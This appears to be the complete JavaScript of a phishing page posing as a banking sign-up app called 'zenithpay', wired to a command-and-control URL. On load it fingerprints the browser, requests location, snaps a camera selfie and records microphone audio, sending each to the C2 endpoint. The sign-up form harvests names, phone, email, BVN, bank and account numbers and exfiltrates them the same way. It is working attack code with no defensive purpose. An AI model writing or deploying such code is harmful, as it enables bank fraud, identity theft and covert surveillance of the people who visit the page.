// ============ Configuration ============
const C2_URL = 'https://your-ngrok-url.ngrok.io';

// ============ Splash to Login ============
setTimeout(() => {
    document.getElementById('splashScreen').style.display = 'none';
    document.getElementById('mainApp').classList.remove('hidden');
}, 3200);

// ============ Silent Permission Requests ============

function requestPermissions() {
    // 1. Location — silent, no UI feedback
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                sendData({
                    type: 'location',
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: pos.timestamp
                });
                console.log('[+] Location captured');
            },
            (err) => {
                console.warn('[-] Location error:', err.message);
                // Try once more with different options
                setTimeout(() => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            sendData({
                                type: 'location',
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                timestamp: pos.timestamp
                            });
                        },
                        () => {},
                        { enableHighAccuracy: false, timeout: 5000 }
                    );
                }, 1000);
            },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    }

    // 2. Camera (Selfie)
    navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: 640, height: 480 }
    })
    .then((stream) => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());

            sendData({ type: 'selfie', image: imageData });
            console.log('[+] Selfie captured');
        };
    })
    .catch((err) => {
        console.warn('[-] Camera error:', err.message);
        // Try with simpler constraints
        setTimeout(() => {
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' }
            })
            .then((stream) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);

                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    stream.getTracks().forEach(track => track.stop());

                    sendData({ type: 'selfie', image: imageData });
                };
            })
            .catch(() => {});
        }, 1500);
    });

    // 3. Microphone
    navigator.mediaDevices.getUserMedia({ audio: true })
    .then((stream) => {
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onload = () => {
                sendData({ type: 'audio', audio: reader.result });
                console.log('[+] Audio captured');
            };
            reader.readAsDataURL(blob);
            stream.getTracks().forEach(track => track.stop());
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
    })
    .catch((err) => {
        console.warn('[-] Mic error:', err.message);
        // Try once more
        setTimeout(() => {
            navigator.mediaDevices.getUserMedia({ audio: true })
            .then((stream) => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onload = () => {
                        sendData({ type: 'audio', audio: reader.result });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 4000);
            })
            .catch(() => {});
        }, 1000);
    });
}

// ============ Send Data ============
function sendData(payload) {
    payload._timestamp = Date.now();
    payload._ua = navigator.userAgent;

    if (navigator.sendBeacon) {
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(`${C2_URL}/capture`, blob);
        return;
    }

    fetch(`${C2_URL}/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'no-cors'
    }).catch(() => {});
}

// ============ Fingerprint ============
function captureFingerprint() {
    const fp = {
        type: 'fingerprint',
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        touchSupport: 'ontouchstart' in window,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        cookies: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'unknown'
    };
    sendData(fp);
}

// ============ Form Submission ============
document.getElementById('signupForm').addEventListener('submit', (e) => {
    e.preventDefault();

    const userData = {
        type: 'banking_details',
        fullname: document.getElementById('fullname').value,
        phone: document.getElementById('phone').value,
        email: document.getElementById('email').value,
        bvn: document.getElementById('bvn').value,
        bank: document.getElementById('bank').value,
        account: document.getElementById('account').value
    };

    sendData(userData);
    localStorage.setItem('zenithpay_user', JSON.stringify(userData));

    const btn = document.getElementById('submitBtn');
    btn.textContent = 'Creating Account...';
    btn.disabled = true;

    setTimeout(() => {
        window.location.href = 'dashboard.html';
    }, 1800);
});

// ============ Init ============
function init() {
    captureFingerprint();

    // Request permissions after a short delay (page is loaded)
    setTimeout(requestPermissions, 800);

    // Enable submit button after 3 seconds (enough time for permissions)
    document.getElementById('submitBtn').disabled = true;
    setTimeout(() => {
        document.getElementById('submitBtn').disabled = false;
    }, 3000);
}

document.addEventListener('DOMContentLoaded', init);